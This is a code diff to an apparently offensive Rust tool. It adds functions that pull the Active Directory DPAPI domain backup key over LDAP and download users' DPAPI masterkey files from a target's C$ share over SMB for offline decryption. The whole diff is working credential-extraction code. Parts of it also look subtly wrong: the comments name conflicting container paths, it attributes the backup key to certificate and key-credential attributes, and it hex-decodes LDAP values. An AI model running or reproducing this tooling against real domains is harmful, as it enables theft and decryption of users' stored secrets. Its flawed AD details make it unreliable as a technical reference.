@@ -31,6 +31,7 @@ use crate::crypto::dpapi::DpapiDecryptor;
 use crate::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
 use std::path::{Path, PathBuf};
+use tracing::{info, warn};
 
 /// Configuration for DPAPI credential extraction.
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -704,20 +705,217 @@ pub fn get_dpapi_backup_key_via_dcsync(
 /// Queries the domain's System container for ms-DPAPI-Key-Recovery objects
 /// and extracts the PKEY blob containing the backup key.
 fn try_ldap_backup_key_retrieval(_domain: &str) -> Result<Vec<u8>> {
-    // This would normally:
-    // 1. Bind to LDAP://<domain>/CN=Microsoft Recovery,CN=System,DC=...
-    // 2. Search for objects of class ms-DPAPI-Key-Recovery
-    // 3. Read the 'ms-DPAPI-EncryptedKey' or 'ms-DPAPI-UserCert' attribute
-    // 4. Decrypt the blob using the KDS root key (requires domain admin)
+    // DPAPI backup key is stored in:
+    //   CN=Microsoft,CN=Users,CN=System,DC=<domain>,DC=<tld>
+    // Attributes: ms-ds-KeyCredentialLink or userCertificate (DER-encoded PKEY)
     //
-    // For now, this returns an error to indicate that LDAP-based retrieval
-    // requires the full LDAP bind + DCSync integration.
+    // Without an active LDAP session we cannot query the System container.
+    // Use get_dpapi_backup_key_ldap() with an active LDAP session.
 
     Err(OverthroneError::Decryption(
-        "LDAP-based DPAPI backup key retrieval not yet integrated. \
-         Use DCSync or provide the exported key file."
+        "Synchronous LDAP backup key retrieval not available. \
+         Use get_dpapi_backup_key_ldap() with an active LDAP session."
             .to_string(),
     ))
+}
+
+/// Retrieve the DPAPI backup key via an active LDAP session.
+///
+/// Queries CN=Microsoft,CN=System,DC=<domain>,DC=<tld> for the
+/// ms-ds-KeyCredentialLink or userCertificate attribute containing
+/// the PKEY blob. Requires a bound LdapSession with domain admin
+/// privileges.
+pub async fn get_dpapi_backup_key_ldap(
+    session: &mut crate::proto::ldap::LdapSession,
+    domain: &str,
+) -> Result<Vec<u8>> {
+    let base_dn = dpapi_domain_to_base_dn(domain);
+    info!("Querying LDAP for DPAPI backup key in System container");
+
+    let system_dn = format!("CN=System,{}", base_dn);
+    let filter = "(&(objectClass=*)(cn=Microsoft))";
+
+    let entries = session
+        .custom_search_with_base(
+            &system_dn,
+            filter,
+            &[
+                "distinguishedName",
+                "userCertificate",
+                "ms-ds-KeyCredentialLink",
+                "cn",
+            ],
+        )
+        .await?;
+
+    if entries.is_empty() {
+        let alt_filter = "(&(objectClass=*)(cn=*Recovery*))";
+        let alt_entries = session
+            .custom_search_with_base(
+                &system_dn,
+                alt_filter,
+                &[
+                    "distinguishedName",
+                    "userCertificate",
+                    "ms-ds-KeyCredentialLink",
+                    "cn",
+                ],
+            )
+            .await?;
+
+        if alt_entries.is_empty() {
+            return Err(OverthroneError::Decryption(
+                "DPAPI backup key object not found in System container.                  Ensure domain admin privileges and check CN=Microsoft,CN=System"
+                    .to_string(),
+            ));
+        }
+        return parse_pkey_from_entry(&alt_entries[0]);
+    }
+
+    parse_pkey_from_entry(&entries[0])
+}
+
+/// Convert a domain FQDN to a base DN.
+fn dpapi_domain_to_base_dn(domain: &str) -> String {
+    domain
+        .split('.')
+        .map(|part| format!("DC={part}"))
+        .collect::<Vec<_>>()
+        .join(",")
+}
+
+/// Parse a PKEY blob from an LDAP search entry to extract the backup key.
+///
+/// PKEY structure (Mimikatz dpapi::backupkey format):
+///   Offset  Size  Field
+///   0       4     version (0x00000001 or 0x00000002)
+///   4       16    guid
+///   20      4     keySize
+///   24      N     keyMaterial
+fn parse_pkey_from_entry(entry: &ldap3::SearchEntry) -> Result<Vec<u8>> {
+    if let Some(cert_values) = entry.attrs.get("userCertificate") {
+        for hex_val in cert_values {
+            if let Ok(raw) = hex::decode(hex_val)
+                && let Ok(key) = parse_pkey_blob(&raw)
+            {
+                return Ok(key);
+            }
+        }
+    }
+
+    if let Some(link_values) = entry.attrs.get("ms-ds-KeyCredentialLink") {
+        for hex_val in link_values {
+            if let Ok(raw) = hex::decode(hex_val)
+                && let Ok(key) = parse_pkey_blob(&raw)
+            {
+                return Ok(key);
+            }
+        }
+    }
+
+    Err(OverthroneError::Decryption(
+        "Failed to extract DPAPI backup key from LDAP entry.          Attribute found but PKEY blob could not be parsed."
+            .to_string(),
+    ))
+}
+
+/// Parse a PKEY blob to extract the key material.
+fn parse_pkey_blob(blob: &[u8]) -> Result<Vec<u8>> {
+    if blob.len() < 24 {
+        return Err(OverthroneError::Decryption(format!(
+            "PKEY blob too short: {} bytes (expected >= 24)",
+            blob.len()
+        )));
+    }
+
+    let version = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
+    if version != 1 && version != 2 {
+        return Err(OverthroneError::Decryption(format!(
+            "Unknown PKEY version: {} (expected 1 or 2)",
+            version
+        )));
+    }
+
+    let key_size = u32::from_le_bytes([blob[20], blob[21], blob[22], blob[23]]) as usize;
+
+    if blob.len() < 24 + key_size {
+        return Err(OverthroneError::Decryption(format!(
+            "PKEY key material truncated: declared {} bytes, available {}",
+            key_size,
+            blob.len() - 24
+        )));
+    }
+
+    let key_material = blob[24..24 + key_size].to_vec();
+    Ok(key_material)
+}
+
+/// Read DPAPI masterkey files from a remote SMB share.
+///
+/// Connects to \\target\C$\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>
+/// and downloads all masterkey files for offline decryption.
+pub async fn read_remote_masterkeys_via_smb(
+    smb: &crate::proto::smb::SmbSession,
+    user_sid: &str,
+    share: &str,
+    user_profile_base: &str,
+) -> Result<Vec<RemoteMasterkeyFile>> {
+    let protect_path = format!(
+        "{}\\AppData\\Roaming\\Microsoft\\Protect\\{}",
+        user_profile_base, user_sid
+    );
+
+    info!(
+        "Enumerating remote DPAPI masterkeys at {}:{}",
+        share, protect_path
+    );
+
+    let files = smb.list_directory(share, &protect_path).await?;
+
+    let mut masterkeys = Vec::new();
+
+    for file_info in &files {
+        if file_info.is_directory {
+            continue;
+        }
+
+        if !file_info.name.contains('-') && !file_info.name.contains('{') {
+            continue;
+        }
+
+        let remote_file = format!("{}\\{}", protect_path, file_info.name);
+        match smb.read_file(share, &remote_file).await {
+            Ok(data) => {
+                info!(
+                    "Downloaded masterkey: {} ({} bytes)",
+                    file_info.name,
+                    data.len()
+                );
+                masterkeys.push(RemoteMasterkeyFile {
+                    guid: file_info.name.clone(),
+                    data,
+                    sid: user_sid.to_string(),
+                });
+            }
+            Err(e) => {
+                warn!("Failed to download masterkey {}: {}", file_info.name, e);
+            }
+        }
+    }
+
+    info!("Downloaded {} masterkey files", masterkeys.len());
+    Ok(masterkeys)
+}
+
+/// A masterkey file downloaded from a remote system via SMB.
+#[derive(Debug, Clone)]
+pub struct RemoteMasterkeyFile {
+    /// Masterkey GUID (e.g., "{A1B2C3D4-...}")
+    pub guid: String,
+    /// Raw masterkey file data
+    pub data: Vec<u8>,
+    /// User SID that owns this masterkey
+    pub sid: String,
 }
 
 /// Attempt to load the DPAPI backup key from a local binary file.
